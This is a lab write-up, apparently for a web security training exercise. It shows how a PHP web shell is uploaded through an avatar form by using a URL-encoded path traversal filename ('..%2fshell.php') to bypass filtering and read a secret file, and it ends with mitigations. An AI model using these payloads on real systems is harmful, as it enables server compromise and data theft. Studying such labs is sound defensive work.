# Lab Name
Web shell upload via path traversal

## Vulnerability
Unrestricted File Upload – Path Traversal Leading to Remote Code Execution (RCE)

## Objective
Exploit the avatar upload functionality by using path traversal in the uploaded filename to place a malicious PHP file into an executable directory, retrieve Carlos's secret, and solve the lab.

## Entry Point
Avatar Upload functionality

## Exploitation Type
Unrestricted File Upload / Path Traversal / Remote Code Execution (RCE)

## Methodology
1. Open Burp's browser and log in using the provided user credentials.

2. Navigate to the **My Account** page and upload any valid image as your avatar.

3. Return to the account page and verify that the uploaded avatar is displayed successfully.

4. In **Burp Suite**, go to **Proxy > HTTP History** and locate the request used to retrieve your uploaded avatar.

Example:

```http
GET /files/avatars/image.jpg HTTP/1.1
```

5. Send this request to **Burp Repeater**.

6. On your local machine, create a file named **shell.php** containing the following PHP code:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

7. Upload **shell.php** as your avatar.

8. Observe that the application allows the upload without blocking PHP files.

9. In **Burp Repeater**, modify the avatar retrieval request by replacing the image filename with **shell.php**.

```http
GET /files/avatars/shell.php HTTP/1.1
```

10. Send the request and observe that the server returns the PHP source code as plain text instead of executing it.

11. In **Burp Suite**, locate the **POST /my-account/avatar** upload request in **HTTP History** and send it to **Burp Repeater**.

12. Locate the **Content-Disposition** header for the uploaded file and modify the filename as follows:

```http
Content-Disposition: form-data; name="avatar"; filename="../shell.php"
```

13. Send the request.

14. Observe that the response indicates the file has been uploaded as:

```text
avatars/shell.php
```

This suggests that the server strips the directory traversal sequence.

15. Obfuscate the traversal sequence by URL-encoding the forward slash.

```http
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
```

16. Send the modified request.

17. Observe that the response now indicates:

```text
The file avatars/../shell.php has been uploaded.
```

This confirms that the server URL-decodes the filename before storing it.

18. Return to the browser and reload your account page.

19. In **Burp HTTP History**, locate the following request:

```http
GET /files/avatars/..%2fshell.php HTTP/1.1
```

20. Observe that the PHP file is executed and the response contains the contents of **/home/carlos/secret**.

21. Since the file has been uploaded one directory higher, it can also be accessed directly using:

```http
GET /files/shell.php HTTP/1.1
```

22. Copy Carlos's secret from the response and submit it to solve the lab.

## Payload Used

### PHP File

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

### Initial Filename

```http
filename="../shell.php"
```

### Bypass Payload

```http
filename="..%2fshell.php"
```

### Request

```http
GET /files/shell.php HTTP/1.1
```

## Result
Successfully bypassed the application's path traversal protection by URL-encoding the traversal sequence, uploaded the PHP file outside the intended upload directory, executed it on the server, retrieved Carlos's secret, and solved the lab.

## Impact
- Remote Code Execution (RCE)
- Directory Traversal
- Arbitrary file upload
- Sensitive file disclosure
- Complete server compromise

## Mitigation
- Remove or reject directory traversal sequences before URL decoding.
- Canonicalize file paths before validation.
- Store uploaded files outside the web root.
- Disable execution of uploaded files.
- Rename uploaded files using server-generated filenames.
- Validate both filenames and file paths on the server.

## Learning
This vulnerability occurs because the application attempts to block directory traversal by removing sequences such as `../` before URL decoding the filename. By URL-encoding the forward slash (`..%2f`), the traversal sequence bypasses the initial validation and is decoded later by the server. As a result, the uploaded PHP file is stored outside the intended upload directory, where it is executed instead of being served as plain text, leading to Remote Code Execution.
